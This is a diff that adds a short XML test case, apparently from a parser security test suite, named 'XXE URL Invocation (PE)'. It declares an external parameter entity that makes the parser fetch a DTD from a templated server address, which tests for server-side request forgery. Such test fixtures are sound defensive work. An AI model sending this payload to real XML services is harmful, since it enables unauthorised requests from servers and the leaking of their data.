@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--;testcase
+[General]
+name: XXE URL Invocation (PE)
+description: Server Side Request Forgery Attack via External Entity Expansion (XXE) (Parameter Entity Version)
+-->
+<!DOCTYPE data [
+  <!ELEMENT data (#PCDATA)>
+  <!ENTITY % remote SYSTEM "http://{server_address}/xxe-pe.dtd">
+  %remote;
+]>
+<data>This is a test.</data>
